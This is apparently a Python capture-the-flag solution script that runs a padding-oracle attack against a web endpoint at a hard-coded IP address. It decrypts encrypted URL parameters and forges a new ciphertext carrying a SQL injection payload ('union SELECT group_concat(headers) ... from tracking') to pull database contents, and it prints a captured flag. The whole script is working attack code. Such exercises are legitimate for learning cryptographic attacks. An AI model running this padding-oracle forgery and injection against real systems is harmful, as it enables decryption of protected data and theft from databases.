#!/usr/bin/env python

from padding_oracle import PaddingOracle
from optimized_alphabets import json_alphabet

import requests
import codecs
import binascii

# This function has to be implemented and will be passed to the PaddingOracle constructor.
# It gets a hex encoded cipher text and has to return True if it can be decrypted successfully,
# False otherwise.
# 
# Here is an example implementation that I used for P.W.N. CTF 2018.
def cipher_text2postCt(cipher_text):
    postCt = codecs.encode(cipher_text, 'base64')
    postCt = postCt.decode('utf8')
    postCt = postCt.replace('=', '~').replace('/', '!').replace('+', '-').replace('\n', '')
    return postCt

def postCt2cipher_text(postCt):
    postCt = postCt.replace('~', '=').replace('!', '/').replace('-', '+')
    cipher_text = codecs.decode(bytes(postCt, 'utf8'), 'base64')
    return cipher_text

def oracle(cipher_hex):
    # headers = {'Cookie': 'vals={}'.format(cipher_hex)}
    # r = requests.get('http://converter.uni.hctf.fun/convert', headers=headers)
    r = requests.get('http://35.190.155.168:5001/c97c7dac31/?post=' + cipher_text2postCt(binascii.unhexlify(cipher_hex)))
    response = r.content

    if b'PaddingException' not in response:
        return True
    else:
        return False


# Instantiate the helper with the oracle implementation
o = PaddingOracle(oracle, max_retries=-1)

# Decrypt the plain text.
# To make the guesswork faster, use an alphabet optimized for JSON data.
# postCt = 'dOBSRluUlvf9XOPN!p3EHqsQrH5kvgM5kuklldYmB!AKYLbby5wLN7esnqvKeuWyrWdGn6vh90GDPpw1wTLjxwSvJESUE-NNyy7!Daa60JsE67OmDja3yTPlG8TleoIhfTEbEpsRMOP0pZ94Xwa4HeY8Iz2L5aMtFZFZrLAEUEYJohNYE0v22s39ShLYB5l0AK9ppmZl4O5waw8RZo1ZfA~~'
# cipher_text = postCt2cipher_text(postCt)
# cipher = binascii.hexlify(cipher_text).decode("utf-8")
# print(cipher)
# plain, padding = o.decrypt(cipher, optimized_alphabet=json_alphabet())
# print('Plaintext: {}'.format(plain))

# Craft a modified but valid cipher text
cipher = '74e052465b9496f7fd5ce3cdfe9dc41eab10ac7e64be033992e92595d62607f00a60b6dbcb9c0b37b7ac9eabca7ae5b2ad67469fabe1f741833e9c35c132e3c704af24449413e34dcb2eff0da6bad09b04ebb3a60e36b7c933e51bc4e57a82217d311b129b1130e3f4a59f785f06b81de63c233d8be5a32d159159acb004504609a21358134bf6dacdfd4a12d807997400af69a66665e0ee706b0f11668d597c'
cipher = cipher[64:]
plain = b'{"flag": "^FLAG^09c843db81f89a10c00376e486d2976a04797bdd579dd47ee6e75fc8e156f81d$FLAG$", "id": "2", "key": "VaEh4dIT7t-rXora5k34Pg~~"}'
plain = plain[32:]
plain_new = b'{"id": "0 union SELECT group_concat(headers), 1 from tracking # 2", "key": "VaEh4dIT7t-rXora5k34Pg~~"}'
# plain =   b'c00376e486d2976a04797bdd579dd47ee6e75fc8e156f81d$FLAG$", "id": "2", "key": "VaEh4dIT7t-rXora5k34Pg~~"}'

cipher_new = o.craft(cipher, plain, plain_new)
print(cipher_new)
print('Modified: {}'.format(cipher_text2postCt(binascii.unhexlify(cipher_new))))